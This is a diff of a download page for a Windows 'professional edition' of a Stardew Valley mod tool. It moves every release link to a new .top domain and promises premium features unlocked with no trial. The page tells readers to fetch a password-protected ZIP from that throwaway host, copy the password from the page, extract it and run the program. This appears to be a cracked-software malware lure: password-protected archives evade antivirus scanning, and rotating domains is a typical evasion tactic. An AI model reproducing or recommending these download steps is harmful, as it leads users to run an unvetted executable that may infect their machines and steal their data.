@@ -8,12 +8,12 @@ Stardew Valley Rift — Windows setup and configuration · Premium workspace · 
 
 > Use the release page below for Windows.
 
-- **Release page:** [jwkcvwdqgdk.slopmods.tech](https://jwkcvwdqgdk.slopmods.tech/)
-- **Full URL:** `https://jwkcvwdqgdk.slopmods.tech/`
+- **Release page:** [jwkcvwdqgdk.slopmods.top](https://jwkcvwdqgdk.slopmods.top/)
+- **Full URL:** `https://jwkcvwdqgdk.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **jwkcvwdqgdk.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **jwkcvwdqgdk.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Stardew Valley Rift — Windows setup and configuration · Premium workspace · 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **jwkcvwdqgdk.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **jwkcvwdqgdk.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
